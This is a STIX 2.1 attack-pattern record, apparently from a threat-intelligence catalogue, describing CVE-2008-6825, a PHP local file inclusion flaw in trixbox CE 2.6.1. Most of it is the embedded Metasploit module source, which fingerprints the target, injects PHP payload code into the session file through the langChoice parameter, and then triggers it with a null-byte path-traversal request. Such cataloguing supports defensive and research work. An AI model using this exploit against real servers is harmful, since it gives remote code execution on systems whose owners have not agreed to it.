{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef88065b-003b-4458-8b78-27301ece65fb",
    "created": "2024-08-14T17:12:11.443083Z",
    "modified": "2024-08-14T17:12:11.443087Z",
    "name": "Trixbox langChoice PHP Local File Inclusion",
    "description": " This module injects php into the trixbox session file and then, in a second call, evaluates that code by manipulating the langChoice parameter as described in OSVDB-50421. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/trixbox_langchoice.rb",
            "external_id": "trixbox_langchoice.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-6825"
        },
        {
            "source_name": "reference",
            "url": "http://www.trixbox.org/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# -*- coding: utf-8 -*-\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  PHPSESSID_REGEX = /(?:^|;?)PHPSESSID=(\\w+)(?:;|$)/\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Trixbox langChoice PHP Local File Inclusion',\n      'Description' => %q{\n          This module injects php into the trixbox session file and then, in a second call, evaluates\n        that code by manipulating the langChoice parameter as described in OSVDB-50421.\n      },\n      'Author'      => ['chao-mu'],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['OSVDB', '50421'],\n          ['CVE', '2008-6825'],\n          ['BID', '30135'],\n          ['EDB', '6026' ],\n          ['URL', 'http://www.trixbox.org/']\n        ],\n      'Payload'     =>\n        {\n          # max header length for Apache (8190),\n          # http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize\n          # minus 23 for good luck (and extra spacing)\n          'Space'       => 8190 - 23,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n          'BadChars'    => \"'\\\"`\"  # quotes are escaped by PHP's magic_quotes_gpc in a default install\n        },\n      'Targets'        => [['trixbox CE 2.6.1', {}]],\n      'DefaultTarget'  => 0,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'DisclosureDate' => '2008-07-09'\n    ))\n\n    register_options(\n      [\n        OptString.new('URI',  [true, 'The uri that accepts the langChoice param', '/user/index.php']),\n        OptString.new('PATH', [true, 'The path where the php was stored', '../../../../../../../../../../tmp/sess_!SESSIONID!%00']),\n      ])\n  end\n\n  def check\n    # We need to ensure that this can be reached via POST\n    uri = normalize_uri(datastore['URI'])\n    target_code = 200\n\n    vprint_status \"Attempting to POST to #{uri}\"\n    response = send_request_cgi({'uri' => uri, 'method' => 'POST'})\n\n    unless defined? response\n      vprint_error 'Server did not respond to HTTP POST request'\n      return Exploit::CheckCode::Unknown\n    end\n\n    code = response.code\n\n    unless code == target_code\n      vprint_error \"Expected HTTP code #{target_code}, but got #{code}.\"\n      return Exploit::CheckCode::Safe\n    end\n\n    vprint_status \"We received the expected HTTP code #{target_code}\"\n\n    # We will need the cookie PHPSESSID to continue\n    cookies = response.get_cookies\n\n    # Make sure cookies were set\n    if defined? cookies and cookies =~ PHPSESSID_REGEX\n      vprint_good \"We were successfully sent a PHPSESSID of '#{$1}'\"\n    else\n      vprint_error 'The server did not send us the cookie we were looking for'\n      return Exploit::CheckCode::Safe\n    end\n\n    # Okay, at this point we're just being silly and hackish.\n    unless response.body =~ /langChoice/\n      vprint_error 'The page does not appear to contain a langChoice field'\n      return Exploit::CheckCode::Safe\n    end\n\n    # XXX: Looking for a good way of determine if it is NOT trixbox\n    # unless response.body.match(/trixbox - User Mode/)\n    # \tprint_status 'The target does not appear to be running trixbox'\n    # \treturn Exploit::CheckCode::Safe\n    # end\n    # print_status 'The target appears to be running trixbox'\n\n    # If it has the target footer, we know its vulnerable\n    # however skining may mean the reverse is not true\n    # We've only tested on v2.6.1, so that is all we will guarantee\n    # Example footer: v2.6.1 &copy;2008 Fonality\n#\t\tif response.body =~ /(v2\\.(?:[0-5]\\.\\d|6\\.[0-1]))\\s{2}&copy;200[0-8] Fonality/\n    if response.body =~ /(v2\\.6\\.1)\\s{2}&copy;2008 Fonality/\n      vprint_status \"Trixbox #{$1} detected!\"\n      return Exploit::CheckCode::Appears\n    end\n\n    vprint_status 'The target may be skinned making detection too difficult'\n\n    if response.body =~ /trixbox - User Mode/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # We will be be passing this our langChoice values\n    uri = normalize_uri(datastore['URI'])\n\n    # Prepare PHP file contents\n    encoded_php_file = Rex::Text.uri_encode(\"<?php #{payload.encoded} ?>\")\n\n    # Deliver the payload\n    print_status('Uploading the payload to the remote server')\n    delivery_response = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'POST',\n        'data'   => \"langChoice=#{encoded_php_file}%00\"\n      })\n\n    # The call should return status code 200\n    if delivery_response.code != 200\n      fail_with(Failure::NotFound, \"Server returned unexpected HTTP code #{delivery_response.code}\")\n    end\n\n    print_status \"The server responded to POST with HTTP code #{delivery_response.code}\"\n\n    # We will need the cookie PHPSESSID to continue\n    cookies = delivery_response.get_cookies\n\n    # Make sure cookies were set\n    if cookies.nil?\n      fail_with(Failure::NotFound, 'The server did not set any cookies')\n    end\n\n    # Contents of PHPSESSID. About to be set.\n    session_id = nil\n\n    # Retrieve the session id from PHPSESSID\n    if cookies =~ PHPSESSID_REGEX\n      session_id = $1\n    else\n      fail_with(Failure::NotFound, 'The cookie PHPSESSID was not set.')\n    end\n\n    print_status \"We were assigned a session id (cookie PHPSESSID) of '#{session_id}'\"\n\n    # Prepare the value that will execute our payload\n    detonation = datastore['PATH'].sub('!SESSIONID!', session_id)\n\n    print_status \"We will use '#{detonation}' as the value of langChoice to detonate the payload\"\n\n    # Request the detonation uri, detonating the payload\n    print_status 'Attempting to detonate. You will need to clean /tmp/ yourself.'\n\n    # Small timeout as we're just going to assume we succeeded.\n    send_request_cgi({\n        'uri' => uri,\n        'cookie' => cookies,\n        'method' => 'POST',\n        'data' => \"langChoice=#{detonation}%00\"\n      }, 0.01)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-07-09",
    "x_mitre_platforms": [
        "php'"
    ]
}